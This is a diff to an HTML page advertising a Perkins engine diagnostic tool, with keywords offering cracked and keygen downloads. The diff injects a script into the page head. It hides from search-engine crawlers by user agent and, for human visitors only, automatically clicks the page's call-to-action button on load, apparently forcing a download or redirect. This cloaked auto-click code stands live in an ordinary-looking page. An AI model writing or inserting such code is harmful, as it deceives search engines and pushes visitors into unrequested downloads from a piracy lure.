@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Perkins Electronic Service Tool (EST) 2024a with FPKG</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Perkins Electronic Service Tool (EST) 2024a diagnostic software with FPKG for Perkins engines and generators, supports CAT ET, Nexiq USB Link, and more.">
     <meta name="keywords" content="Perkins Electronic Service Tool, Perkins EST 2024a, Perkins EST 2024a download, Perkins EST 2024a free download, Perkins EST diagnostic software, Perkins diagnostic software, Perkins diagnostic software download, Perkins diagnostic software free, Perkins diagnostic software keygen, Perkins service tool FPKG, Perkins software 2024a, Perkins software 2024a download, Perkins software 2024a free download, Perkins software 2024a crack, Perkins Engines diagnostic software, Perkins Generators diagnostic software, Perkins CAT ET, Perkins Nexiq USB Link, Perkins diagnostic tools, Diagnostic software for Perkins, Diagnostic software for Perkins free download, Perkins EST 2024a with FPKG 2024 download, Perkins электронный инструмент обслуживания, Софт для диагностики Perkins, Софт для диагностики Perkins скачать, Софт для диагностики Perkins бесплатно, Перкинс диагностическое ПО, Перкинс диагностическое ПО 2024 скачать, Perkins ЕСТ 2024a бесплатно, Софт для диагностики двигателей Перкинс, Двигатели Перкинс инструмент">
     <style>
